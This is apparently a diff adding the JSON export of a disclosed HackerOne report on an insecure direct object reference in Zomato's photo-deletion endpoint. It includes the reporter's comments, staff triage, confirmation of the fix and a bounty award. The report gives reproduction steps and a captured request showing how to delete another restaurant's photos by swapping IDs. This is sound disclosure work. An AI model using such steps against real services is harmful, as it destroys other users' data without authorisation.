+            "message": "Hence I set it as Low :) Thanks.", 
+            "markdown_message": "<p>Hence I set it as Low :) Thanks.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3286543, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-03T23:32:43.546Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-03T23:32:43.546Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "I see makes sense. I thought being able to target would change severity but I see your point. I should also point out that I tried to delete user uploaded photo with a regular user but got an error saying I can only delete photos uploaded by me so that part is not vulnerable.\n\nThanks for the explanation.", 
+            "markdown_message": "<p>I see makes sense. I thought being able to target would change severity but I see your point. I should also point out that I tried to delete user uploaded photo with a regular user but got an error saying I can only delete photos uploaded by me so that part is not vulnerable.</p>\n\n<p>Thanks for the explanation.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3287005, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "emitrani", 
+                "url": "/emitrani"
+            }, 
+            "created_at": "2018-09-05T10:39:49.459Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T10:39:49.459Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "Hi @emitrani - This has been fixed. Please check and confirm!\n\nThanks for helping us keep @zomato secure :) \n\nCheers.", 
+            "markdown_message": "<p>Hi <a href=\"/emitrani\">@emitrani</a> - This has been fixed. Please check and confirm!</p>\n\n<p>Thanks for helping us keep <a href=\"/zomato\">@zomato</a> secure :) </p>\n\n<p>Cheers.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3296291, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-05T11:17:50.569Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T11:17:50.569Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "Thanks for the update @prateek_0490-zomato,\n\nIs there an image you want me to test this on? When I tried to delete the old picture I already deleted I got a `{\"status\":\"success\"}` response, however that might be because that picture no longer exists.\n\nI'm sure the fix is right but I have no way to confirm it properly.\n\nRegards,\nEray", 
+            "markdown_message": "<p>Thanks for the update <a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a>,</p>\n\n<p>Is there an image you want me to test this on? When I tried to delete the old picture I already deleted I got a <code>{&quot;status&quot;:&quot;success&quot;}</code> response, however that might be because that picture no longer exists.</p>\n\n<p>I&#39;m sure the fix is right but I have no way to confirm it properly.</p>\n\n<p>Regards,<br>\nEray</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3296377, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-05T11:19:58.030Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T16:50:58.263Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "@emitrani - Can you try out on this image - `https://www.zomato.com/\u2588\u2588\u2588\u2588\u2588`", 
+            "markdown_message": "<p><a href=\"/emitrani\">@emitrani</a> - Can you try out on this image - <code>https://www.zomato.com/\u2588\u2588\u2588\u2588\u2588</code></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3296379, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-05T11:24:10.165Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T11:24:10.165Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "Oh Okay I see. I still get the `{\"status\":\"success\"}` response but the photo is no longer deleted.\n\nI confirm the fix but you might want to edit the response string with the new code path. \n\nRegards.\nEray", 
+            "markdown_message": "<p>Oh Okay I see. I still get the <code>{&quot;status&quot;:&quot;success&quot;}</code> response but the photo is no longer deleted.</p>\n\n<p>I confirm the fix but you might want to edit the response string with the new code path. </p>\n\n<p>Regards.<br>\nEray</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3296402, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-05T15:11:33.393Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T15:11:33.393Z", 
+            "actor": {
+                "username": "emitrani", 
+                "url": "/emitrani", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/206/181/d9825aec6bc5bb13768b86c22d02a6fc7f42842b_medium.PNG?1528334442"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "first_to_agree": true, 
+            "message": "I think the POC is pretty funny and tried to summarize the report as best I can since Zomato prefers summary disclosure.\n\nFeel free to accept or deny it.\n\nRegards,\nEray", 
+            "markdown_message": "<p>I think the POC is pretty funny and tried to summarize the report as best I can since Zomato prefers summary disclosure.</p>\n\n<p>Feel free to accept or deny it.</p>\n\n<p>Regards,<br>\nEray</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3297166, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-09-05T16:54:35.857Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T16:54:35.857Z", 
+            "actor": {
+                "url": "/zomato", 
+                "profile": {
+                    "name": "Zomato"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
+                }
+            }, 
+            "team_handle": "zomato", 
+            "bonus_amount": "300.0", 
+            "bounty_amount": "300.0", 
+            "collaborator": {
+                "username": "emitrani", 
+                "url": "/emitrani"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3297661, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-05T17:01:23.680Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T17:01:23.680Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3297697, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-05T17:01:23.838Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-05T17:01:23.838Z", 
+            "actor": {
+                "username": "prateek_0490-zomato", 
+                "url": "/prateek_0490-zomato", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "zomato", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3297698, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "emitrani", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/emitrani", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/206/181/aea1f55841c3e6c5ea9b4c3223dde01ba14dc6d0_small.PNG?1528334442"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 55, 
+        "name": "Insecure Direct Object Reference (IDOR)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-09-05T17:01:23.798Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/404797", 
+    "created_at": "2018-09-03T16:42:10.715Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary:</strong> The parameter <code>photo_ids</code> in below request is vulnerable to IDOR</p>\n\n<p>/php/client_manage_handler?\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;case=remove-active-photo</p>\n\n<p><strong>Description:</strong> Since there is no check for res_id or ownership I was able to delete Gerben&#39;s image by just using the photo_id from his store. This is a problem because it is a get request and I can try a bunch of ID&#39;s to randomly delete photos that don&#39;t belong to me or try to find a way to leak this ID from store page to do targeted deletes. </p>\n\n<p>I believe if you try to delete multiple photos there will be more ids in the request so that would allow to expand the attack by trying a lot of ids at once.</p>\n\n<p><strong>Platform(s) Affected:</strong> [website]</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ol>\n<li>Get 2 stores.</li>\n<li>With store 1 navigate to <a title=\"https://www.zomato.com/clients/manage_photos.php\" href=\"/redirect?signature=c4c2dc78189246836c2144b3d5ee4f950e0c004f&amp;url=https%3A%2F%2Fwww.zomato.com%2Fclients%2Fmanage_photos.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.zomato.com/clients/manage_photos.php</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Start to delete a photo and capture the request that looks like :</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>GET /php/client_manage_handler?\u2588\u2588\u2588&amp;case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\n</code></pre>\n<p>4 . Save the photo_ids parameter<br>\n5 . Go to your second restaurant account and capture the same request with a different res_id and cookies<br>\n6 . Replace the <code>photo_ids</code> with the id from step 4 and send request.<br>\n7 . Observe the photo is deleted.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>By using targeted or blind attacks it is possible to delete photos that don&#39;t belong to a restaurant because of this IDOR. My leading theory is that currently you are checking that the logged in user has permissions on the res_id in the request but not verifying that the res_id owns that photograph. There should be an additional check to ensure that the photo_id belongs to that restaurant before deleting it.</p>\n\n<p>Regards,<br>\nEray</p>\n", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.zomato.com", 
+            "about": "The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide.", 
+            "twitter_handle": "Zomato", 
+            "name": "Zomato"
+        }, 
+        "handle": "zomato", 
+        "url": "https://hackerone.com/zomato", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/943/7b54bc7a4a265c47ec0d946a6abf079078b82401_small.png?1526447675", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 2943, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
